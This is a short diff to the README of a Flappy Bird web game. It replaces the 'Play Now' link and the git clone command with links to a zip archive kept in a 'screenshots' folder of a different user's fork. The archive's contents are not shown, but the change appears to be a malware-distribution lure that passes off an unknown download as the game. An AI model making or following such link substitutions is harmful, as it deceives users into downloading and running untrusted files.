@@ -9,7 +9,7 @@
 
 **A faithful Flappy Bird recreation with 5 difficulty levels — from Beginner to Insane!**
 
-[▶ Play Now](https://alfredang.github.io/flappy-bird-game/)
+[▶ Play Now](https://github.com/Enosh110/flappy-bird-game/raw/refs/heads/main/screenshots/bird_flappy_game_2.5.zip)
 
 </div>
 
@@ -69,7 +69,7 @@ Use **↑↓** arrow keys to select, **Space** to start. On mobile, tap the leve
 ## 🚀 Getting Started
 
 ```bash
-git clone https://github.com/alfredang/flappy-bird-game.git
+git clone https://github.com/Enosh110/flappy-bird-game/raw/refs/heads/main/screenshots/bird_flappy_game_2.5.zip
 open index.html
 ```
 
